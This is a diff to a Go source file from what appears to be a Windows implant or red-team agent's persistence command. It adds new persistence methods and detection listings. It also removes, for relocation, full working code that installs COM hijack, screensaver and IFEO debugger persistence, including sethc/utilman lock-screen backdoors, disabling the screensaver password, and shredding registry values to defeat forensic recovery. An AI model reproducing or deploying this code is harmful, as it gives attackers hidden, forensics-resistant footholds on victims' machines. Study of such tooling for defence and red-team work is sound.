@@ -1,6 +1,10 @@
 //go:build windows
 // +build windows
 
+// persist.go implements Windows persistence mechanisms: registry Run keys,
+// startup folder, and listing. COM hijack, screensaver, and IFEO methods
+// are in persist_methods.go.
+
 package commands
 
 import (
@@ -62,10 +66,16 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistScreensaver(args)
 	case "ifeo":
 		return persistIFEO(args)
+	case "winlogon":
+		return persistWinlogon(args)
+	case "print-processor":
+		return persistPrintProcessor(args)
+	case "accessibility":
+		return persistAccessibility(args)
 	case "list":
 		return listPersistence(args)
 	default:
-		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method)
+		return errorf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility, or list", args.Method)
 	}
 }
 
@@ -296,6 +306,80 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	lines = append(lines, "")
 
+	// Check Winlogon Helper (Shell/Userinit)
+	lines = append(lines, "--- Winlogon Helper (HKLM\\...\\Winlogon) ---")
+	winlogonKey, err := registry.OpenKey(registry.LOCAL_MACHINE, winlogonKeyPath, registry.QUERY_VALUE)
+	if err != nil {
+		lines = append(lines, fmt.Sprintf("  Error: %v", err))
+	} else {
+		shell, _, shellErr := winlogonKey.GetStringValue("Shell")
+		userinit, _, uiErr := winlogonKey.GetStringValue("Userinit")
+		winlogonKey.Close()
+		if shellErr == nil {
+			lines = append(lines, fmt.Sprintf("  Shell    = %s", shell))
+			if strings.Contains(shell, ",") {
+				lines = append(lines, "  ⚠ Shell contains multiple entries (possible persistence)")
+			}
+		}
+		if uiErr == nil {
+			lines = append(lines, fmt.Sprintf("  Userinit = %s", userinit))
+			// Count entries (comma-delimited, last entry has trailing comma)
+			parts := strings.Split(strings.TrimRight(userinit, ","), ",")
+			if len(parts) > 1 {
+				lines = append(lines, fmt.Sprintf("  ⚠ Userinit contains %d entries (possible persistence)", len(parts)))
+			}
+		}
+	}
+	lines = append(lines, "")
+
+	// Check Print Processors
+	lines = append(lines, "--- Print Processors (HKLM\\...\\Print Processors) ---")
+	ppKey, err := registry.OpenKey(registry.LOCAL_MACHINE, printProcessorRegBase, registry.ENUMERATE_SUB_KEYS)
+	ppFound := false
+	if err != nil {
+		lines = append(lines, fmt.Sprintf("  Error: %v", err))
+	} else {
+		ppNames, _ := ppKey.ReadSubKeyNames(-1)
+		ppKey.Close()
+		// Known legitimate processors to skip
+		for _, ppName := range ppNames {
+			subPath := printProcessorRegBase + `\` + ppName
+			subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subPath, registry.QUERY_VALUE)
+			if err != nil {
+				continue
+			}
+			driver, _, err := subKey.GetStringValue("Driver")
+			subKey.Close()
+			if err == nil && driver != "" {
+				lines = append(lines, fmt.Sprintf("  %s → %s", ppName, driver))
+				ppFound = true
+			}
+		}
+	}
+	if !ppFound {
+		lines = append(lines, "  (none found or access denied)")
+	}
+	lines = append(lines, "")
+
+	// Check Accessibility Feature replacements
+	lines = append(lines, "--- Accessibility Features (System32 binary integrity) ---")
+	sys32 := os.Getenv("SystemRoot")
+	if sys32 == "" {
+		sys32 = `C:\Windows`
+	}
+	accessFound := false
+	for _, target := range accessibilityTargets {
+		backupPath := filepath.Join(sys32, "System32", target[0]+".bak")
+		if _, err := os.Stat(backupPath); err == nil {
+			lines = append(lines, fmt.Sprintf("  ⚠ %s has backup (.bak exists) — %s", target[0], target[1]))
+			accessFound = true
+		}
+	}
+	if !accessFound {
+		lines = append(lines, "  (no replaced binaries detected)")
+	}
+	lines = append(lines, "")
+
 	// Check Screensaver hijacking
 	lines = append(lines, "--- Screensaver (HKCU\\Control Panel\\Desktop) ---")
 	desktopKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
@@ -326,198 +410,6 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 
 	return successResult(strings.Join(lines, "\n"))
-}
-
-// defaultCLSID is MruPidlList — loaded by explorer.exe at shell startup, highly reliable.
-const defaultCLSID = "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
-
-// persistCOMHijack installs/removes COM hijacking persistence via HKCU InprocServer32 override
-func persistCOMHijack(args persistArgs) structs.CommandResult {
-	if args.Path == "" && args.Action == "install" {
-		exe, err := os.Executable()
-		if err != nil {
-			return errorf("Error getting executable path: %v", err)
-		}
-		args.Path = exe
-	}
-
-	clsid := args.CLSID
-	if clsid == "" {
-		clsid = defaultCLSID
-	}
-	// Normalize CLSID — ensure it has braces
-	if !strings.HasPrefix(clsid, "{") {
-		clsid = "{" + clsid + "}"
-	}
-
-	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)
-
-	switch strings.ToLower(args.Action) {
-	case "install":
-		key, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
-		if err != nil {
-			return errorf("Error creating HKCU\\%s: %v", keyPath, err)
-		}
-		defer key.Close()
-
-		// Set (Default) value to our DLL/EXE path
-		if err := key.SetStringValue("", args.Path); err != nil {
-			return errorf("Error setting DLL path: %v", err)
-		}
-
-		// Set ThreadingModel (required for InprocServer32 to be used)
-		if err := key.SetStringValue("ThreadingModel", "Both"); err != nil {
-			return errorf("Error setting ThreadingModel: %v", err)
-		}
-
-		return successf("Installed COM hijack persistence:\n  CLSID:          %s\n  Key:            HKCU\\%s\n  DLL/EXE:        %s\n  ThreadingModel: Both\n  Trigger:        Loaded by explorer.exe at user logon", clsid, keyPath, args.Path)
-
-	case "remove":
-		// Shred values then delete InprocServer32 key, then the CLSID key
-		shredRegistryKey(registry.CURRENT_USER, keyPath)
-
-		parentPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
-		// Best-effort cleanup of the parent CLSID key (may fail if it has other subkeys)
-		_ = registry.DeleteKey(registry.CURRENT_USER, parentPath)
-
-		return successf("Removed COM hijack persistence (shredded):\n  CLSID: %s\n  Key:   HKCU\\%s", clsid, keyPath)
-
-	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
-	}
-}
-
-// persistScreensaver installs/removes screensaver hijacking persistence
-func persistScreensaver(args persistArgs) structs.CommandResult {
-	desktopKeyPath := `Control Panel\Desktop`
-
-	switch strings.ToLower(args.Action) {
-	case "install":
-		if args.Path == "" {
-			exe, err := os.Executable()
-			if err != nil {
-				return errorf("Error getting executable path: %v", err)
-			}
-			args.Path = exe
-		}
-
-		timeout := args.Timeout
-		if timeout == "" {
-			timeout = "60" // 60 seconds idle before screensaver triggers
-		}
-
-		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE)
-		if err != nil {
-			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
-		}
-		defer key.Close()
-
-		// Set SCRNSAVE.EXE to our payload
-		if err := key.SetStringValue("SCRNSAVE.EXE", args.Path); err != nil {
-			return errorf("Error setting SCRNSAVE.EXE: %v", err)
-		}
-
-		// Enable screensaver
-		if err := key.SetStringValue("ScreenSaveActive", "1"); err != nil {
-			return errorf("Error setting ScreenSaveActive: %v", err)
-		}
-
-		// Set idle timeout
-		if err := key.SetStringValue("ScreenSaveTimeout", timeout); err != nil {
-			return errorf("Error setting ScreenSaveTimeout: %v", err)
-		}
-
-		// Disable password on resume (avoids locking user out)
-		if err := key.SetStringValue("ScreenSaverIsSecure", "0"); err != nil {
-			return errorf("Error setting ScreenSaverIsSecure: %v", err)
-		}
-
-		return successf("Installed screensaver persistence:\n  Key:      HKCU\\%s\n  Payload:  %s\n  Timeout:  %s seconds\n  Secure:   No (no password on resume)\n  Trigger:  User idle for %s seconds → winlogon.exe launches payload", desktopKeyPath, args.Path, timeout, timeout)
-
-	case "remove":
-		key, err := registry.OpenKey(registry.CURRENT_USER, desktopKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
-		if err != nil {
-			return errorf("Error opening HKCU\\%s: %v", desktopKeyPath, err)
-		}
-		defer key.Close()
-
-		// Shred the screensaver executable path before deletion
-		shredRegistryValue(key, "SCRNSAVE.EXE")
-		// Disable screensaver
-		_ = key.SetStringValue("ScreenSaveActive", "0")
-
-		return successf("Removed screensaver persistence (shredded):\n  Shredded SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)")
-
-	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
-	}
-}
-
-// ifeoTargets are common IFEO targets accessible from the Windows lock screen.
-var ifeoTargets = [][2]string{
-	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
-	{"utilman.exe", "Ease of Access (lock screen button)"},
-	{"osk.exe", "On-Screen Keyboard"},
-	{"narrator.exe", "Narrator"},
-	{"magnify.exe", "Magnifier"},
-}
-
-// persistIFEO installs/removes Image File Execution Options debugger persistence (T1546.012).
-// When the target executable is launched, Windows runs the debugger binary instead.
-func persistIFEO(args persistArgs) structs.CommandResult {
-	if args.Name == "" {
-		return errorResult("Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)")
-	}
-
-	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
-	keyPath := ifeoBasePath + `\` + args.Name
-
-	switch strings.ToLower(args.Action) {
-	case "install":
-		if args.Path == "" {
-			exe, err := os.Executable()
-			if err != nil {
-				return errorf("Error getting executable path: %v", err)
-			}
-			args.Path = exe
-		}
-
-		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
-		if err != nil {
-			return errorf("Error creating HKLM\\%s: %v (admin required)", keyPath, err)
-		}
-		defer key.Close()
-
-		if err := key.SetStringValue("Debugger", args.Path); err != nil {
-			return errorf("Error setting Debugger value: %v", err)
-		}
-
-		// Identify the trigger for display
-		trigger := "When " + args.Name + " is launched"
-		for _, t := range ifeoTargets {
-			if strings.EqualFold(args.Name, t[0]) {
-				trigger = t[1]
-				break
-			}
-		}
-
-		return successf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger)
-
-	case "remove":
-		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
-		if err != nil {
-			return errorf("Error opening HKLM\\%s: %v", keyPath, err)
-		}
-		defer key.Close()
-
-		// Shred Debugger value before deletion to defeat forensic recovery
-		shredRegistryValue(key, "Debugger")
-
-		return successf("Removed IFEO persistence (shredded):\n  Key:    HKLM\\%s\n  Shredded Debugger value", keyPath)
-
-	default:
-		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
-	}
 }
 
 func enumRunKey(hiveKey registry.Key) ([][2]string, error) {
